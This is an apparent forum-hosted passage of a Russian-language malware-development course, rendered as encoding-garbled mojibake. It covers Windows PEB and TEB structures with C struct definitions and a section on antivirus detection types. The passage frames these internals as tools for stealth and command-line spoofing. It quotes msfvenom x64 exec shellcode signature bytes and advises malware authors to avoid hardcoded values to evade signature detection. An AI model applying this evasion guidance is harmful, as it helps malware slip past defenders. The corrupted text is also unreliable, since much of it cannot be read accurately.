Ldr –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –ø–æ–∏—Å–∫–∞ –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–π DLL, –∞ —Ç–∞–∫–∂–µ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–π, –Ω–∞—Ö–æ–¥—è—â–∏—Ö—Å—è –≤ –µ–µ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ. –≠—Ç–æ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ –±—É–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –≤–µ—Ä—Å–∏–∏ GetModuleHandleA/W –¥–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏.<br />
<br />
<b>ProcessParameters</b><br />
<br />
ProcessParameters - —ç—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –≤ PEB. –û–Ω–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—É –ø—Ä–∏ –µ–≥–æ —Å–æ–∑–¥–∞–Ω–∏–∏. –ó–∞–≥—Ä—É–∑—á–∏–∫ Windows –¥–æ–±–∞–≤–ª—è–µ—Ç —ç—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB –ø—Ä–æ—Ü–µ—Å—Å–∞. ProcessParameters - —ç—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É RTL_USER_PROCESS_PARAMETERS, –ø–æ–∫–∞–∑–∞–Ω–Ω—É—é –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[116];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</code></pre>
	</div>
</div><br />
ProcessParameters –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ –±—É–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç–∞–∫–∏—Ö –¥–µ–π—Å—Ç–≤–∏–π, –∫–∞–∫ –ø–æ–¥–º–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏.<br />
<br />
<b>AtlThunkSListPtr &amp; AtlThunkSListPtr32</b><br />
<br />
AtlThunkSListPtr –∏ AtlThunkSListPtr32 –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –º–æ–¥—É–ª–µ–º ATL (Active Template Library) –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Å–≤—è–∑–∞–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Ñ—É–Ω–∫—Ü–∏–π –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è. –§—É–Ω–∫—Ü–∏–∏ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–π, —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –≤ –¥—Ä—É–≥–æ–º –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ, –æ–Ω–∏ —á–∞—Å—Ç–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç —Ñ—É–Ω–∫—Ü–∏–∏, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã–µ –∏–∑ —Ñ–∞–π–ª–∞ DLL (Dynamic Link Library). –°–≤—è–∑–∞–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Ñ—É–Ω–∫—Ü–∏–π –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –º–æ–¥—É–ª–µ–º ATL –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–º –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è.<br />
<br />
<b>PostProcessInitRoutine</b><br />
<br />
–ü–æ–ª–µ PostProcessInitRoutine –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ PEB –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ TLS (Thread Local Storage) –¥–ª—è –≤—Å–µ—Ö –ø–æ—Ç–æ–∫–æ–≤ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ª—é–±—ã—Ö –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–∞–¥–∞—á –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
TLS –∏ –æ–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã TLS –±—É–¥—É—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã –ø–æ–¥—Ä–æ–±–Ω–µ–µ –ø–æ–∑–∂–µ, –∫–æ–≥–¥–∞ —ç—Ç–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è.<br />
<br />
<b>SessionId</b><br />
<br />
SessionId –≤ PEB - —ç—Ç–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä, –ø—Ä–∏—Å–≤–æ–µ–Ω–Ω—ã–π –æ–¥–Ω–æ–π —Å–µ—Å—Å–∏–∏. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤–æ –≤—Ä–µ–º—è —Å–µ—Å—Å–∏–∏.<br />
<br />
<b>Thread Environment Block (TEB)</b><br />
<br />
Thread Environment Block (TEB) - —ç—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Windows, –∫–æ—Ç–æ—Ä–∞—è —Ö—Ä–∞–Ω–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ—Ç–æ–∫–µ. –û–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç –æ–∫—Ä—É–∂–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞, –∫–æ–Ω—Ç–µ–∫—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –¥—Ä—É–≥—É—é —Å–≤—è–∑–∞–Ω–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –û–Ω —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Å—Ç–µ–∫–µ –ø–æ—Ç–æ–∫–∞ –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —è–¥—Ä–æ–º Windows –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞–º–∏.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ TEB</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ TEB –≤ C –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ. –ó–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —á–ª–µ–Ω—ã —ç—Ç–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –º–æ–∂–Ω–æ –∏–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞—Ç—å.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
    PVOID Reserved2[399];
    BYTE Reserved3[1952];
    PVOID TlsSlots[64];
    BYTE Reserved4[8];
    PVOID Reserved5[26];
    PVOID ReservedForOle;
    PVOID Reserved6[4];
    PVOID TlsExpansionSlots;
} TEB, *PTEB;</code></pre>
	</div>
</div><br />
<b>ProcessEnvironmentBlock (PEB)</b><br />
<br />
–≠—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PEB, —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω—É—é –≤—ã—à–µ. PEB –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ –ë–ª–æ–∫–∞ –æ–∫—Ä—É–∂–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞ (TEB) –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–µ–∫—É—â–µ–º –≤—ã–ø–æ–ª–Ω—è—é—â–µ–º—Å—è –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
<b>TlsSlots</b><br />
<br />
–°–ª–æ—Ç—ã TLS (Thread Local Storage) - —ç—Ç–æ –º–µ—Å—Ç–∞ –≤ TEB, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã—Ö –¥–ª—è –ø–æ—Ç–æ–∫–∞. –ö–∞–∂–¥—ã–π –ø–æ—Ç–æ–∫ –≤ Windows –∏–º–µ–µ—Ç —Å–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π TEB, –∏ –∫–∞–∂–¥—ã–π TEB –∏–º–µ–µ—Ç –Ω–∞–±–æ—Ä —Å–ª–æ—Ç–æ–≤ TLS. –ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–∏ —Å–ª–æ—Ç—ã –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã—Ö –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ—Ç–æ–∫–∞, —Ç–∞–∫–∏—Ö –∫–∞–∫ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –¥–ª—è –ø–æ—Ç–æ–∫–∞, –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ã, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –¥–ª—è –ø–æ—Ç–æ–∫–∞, —Å–æ—Å—Ç–æ—è–Ω–∏—è –∏ —Ç–∞–∫ –¥–∞–ª–µ–µ.<br />
<br />
<b>TlsExpansionSlots</b><br />
<br />
–°–ª–æ—Ç—ã —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è TLS –≤ TEB - —ç—Ç–æ –Ω–∞–±–æ—Ä —É–∫–∞–∑–∞—Ç–µ–ª–µ–π, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞ –ø–æ—Ç–æ–∫–∞. –°–ª–æ—Ç—ã —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è TLS –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω—ã –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ DLL.<br />
<br />
<b>–î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ã –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –ø–æ—Ç–æ–∫–∞</b><br />
<br />
–í –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ Windows –∫–∞–∂–¥—ã–π –ø—Ä–æ—Ü–µ—Å—Å –∏–º–µ–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ (PID), –∫–æ—Ç–æ—Ä—ã–π –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ—Ç –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞. PIDs –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —Ä–∞–∑–ª–∏—á–∏—è –æ–¥–Ω–æ–≥–æ —Ä–∞–±–æ—Ç–∞—é—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ—Ç –¥—Ä—É–≥–æ–≥–æ. –¢–∞ –∂–µ –∫–æ–Ω—Ü–µ–ø—Ü–∏—è –ø—Ä–∏–º–µ–Ω—è–µ—Ç—Å—è –∫ —Ä–∞–±–æ—Ç–∞—é—â–µ–º—É –ø–æ—Ç–æ–∫—É, –≥–¥–µ —Ä–∞–±–æ—Ç–∞—é—â–∏–π –ø–æ—Ç–æ–∫ –∏–º–µ–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –µ–≥–æ –æ—Ç–ª–∏—á–∏—è –æ—Ç –æ—Å—Ç–∞–ª—å–Ω—ã—Ö —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ—Ç–æ–∫–æ–≤ (–≤ –ª—é–±–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ) –≤ —Å–∏—Å—Ç–µ–º–µ.<br />
<br />
–≠—Ç–∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –ø–æ—Ç–æ–∫–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –Ω–∏–∂–µ—É–∫–∞–∑–∞–Ω–Ω—ã—Ö WinAPI:<br />
<ul>
<li data-xf-list-type="ul">OpenProcess - –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ —á–µ—Ä–µ–∑ –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä.</li>
<li data-xf-list-type="ul">OpenThread - –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ –ø–æ—Ç–æ–∫–∞ —á–µ—Ä–µ–∑ –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä.</li>
</ul>–≠—Ç–∏ WinAPI –±—É–¥—É—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã –ø–æ–¥—Ä–æ–±–Ω–µ–µ –ø–æ–∑–∂–µ, –∫–æ–≥–¥–∞ —ç—Ç–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è. –ù–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–Ω–∞—Ç—å, —á—Ç–æ –æ—Ç–∫—Ä—ã—Ç—ã–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π —Å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º –æ–±—ä–µ–∫—Ç–æ–º Windows, —Ç–∞–∫–∏–º –∫–∞–∫ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –ø–æ—Ç–æ–∫–∞.<br />
<br />
–î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ã –≤—Å–µ–≥–¥–∞ —Å–ª–µ–¥—É–µ—Ç –∑–∞–∫—Ä—ã–≤–∞—Ç—å –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –æ–Ω–∏ –±–æ–ª—å—à–µ –Ω–µ —Ç—Ä–µ–±—É—é—Ç—Å—è, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å —É—Ç–µ—á–∫–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–æ–≤. –≠—Ç–æ –¥–æ—Å—Ç–∏–≥–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é –≤—ã–∑–æ–≤–∞ WinAPI CloseHandle.</div>
						

							<h2>–í–∏–¥—ã –¥–µ—Ç–µ–∫—Ç–æ–≤</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746732171435.png"
		data-src="https://osint42.org/attachments/1746732171435-png.54/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732171435-png.54/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732171435.png"
			title="1746732171435.png"
			width="822" height="516" loading="lazy" />
	</div><br />
<br />
<b>–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–°–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–µ—Ö–Ω–∏–∫ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è.<br />
–í–∞–∂–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å, –∫–∞–∫–∏–µ –º–µ—Ç–æ–¥—ã —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –¥–ª—è –∫–ª–∞—Å—Å–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ü–û –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ.<br />
<br />
<b>–°—Ç–∞—Ç–∏—á–µ—Å–∫–æ–µ –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ<br />
<br />
–°–∏–≥–Ω–∞—Ç—É—Ä–∞</b> - —ç—Ç–æ —Ä—è–¥ –±–∞–π—Ç–æ–≤ –∏–ª–∏ —Å—Ç—Ä–æ–∫ –≤–Ω—É—Ç—Ä–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û, –∫–æ—Ç–æ—Ä—ã–µ —É–Ω–∏–∫–∞–ª—å–Ω–æ –µ–≥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä—É—é—Ç. –ú–æ–≥—É—Ç —É–∫–∞–∑—ã–≤–∞—Ç—å—Å—è –∏ –¥—Ä—É–≥–∏–µ —É—Å–ª–æ–≤–∏—è, —Ç–∞–∫–∏–µ –∫–∞–∫ –∏–º–µ–Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –∏ –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏. –ö–∞–∫ —Ç–æ–ª—å–∫–æ —Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å–∫–∞–Ω–∏—Ä—É–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—É, –æ–Ω–∞ –ø—ã—Ç–∞–µ—Ç—Å—è —Å–æ–ø–æ—Å—Ç–∞–≤–∏—Ç—å –µ–µ —Å–æ —Å–ø–∏—Å–∫–æ–º –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö –ø—Ä–∞–≤–∏–ª. –≠—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–æ–∑–¥–∞–Ω—ã –∏ –∑–∞–≥—Ä—É–∂–µ–Ω—ã –≤ —Å–∏—Å—Ç–µ–º—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.<br />
YARA - —ç—Ç–æ –æ–¥–∏–Ω –∏–∑ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É—é—Ç –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–∞–≤–∏–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —à–µ–ª–ª-–∫–æ–¥ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –±–∞–π—Ç–æ–≤, –∫–æ—Ç–æ—Ä–∞—è –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –ï–° 48 83 –ï4 –ï–û E8 –°–û 00 00 00 41 51 41 50 52 51, —ç—Ç–æ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —Ç–æ–≥–æ, —á—Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —è–≤–ª—è–µ—Ç—Å—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π Msfvenom&#039;s x64 exec. –¢–æ—Ç –∂–µ –º–µ—Ö–∞–Ω–∏–∑–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è —Å—Ç—Ä–æ–∫ –≤–Ω—É—Ç—Ä–∏ —Ñ–∞–π–ª–∞.<br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–µ –ª–µ–≥–∫–æ –æ–±–æ–π—Ç–∏, –Ω–æ —ç—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏. –í–∞–∂–Ω–æ –∏–∑–±–µ–≥–∞—Ç—å –∂–µ—Å—Ç–∫–æ–≥–æ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏–π –≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ü–û, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è —É–Ω–∏–∫–∞–ª—å–Ω–æ–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –ö–æ–¥, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ —ç—Ç–æ–º –∫—É—Ä—Å–µ, –ø—ã—Ç–∞–µ—Ç—Å—è –∏–∑–±–µ–≥–∞—Ç—å –∂–µ—Å—Ç–∫–æ–≥–æ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω—ã, –∏ –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∏–ª–∏ –≤—ã—á–∏—Å–ª—è–µ—Ç –∑–Ω–∞—á–µ–Ω–∏—è.<br />
<br />
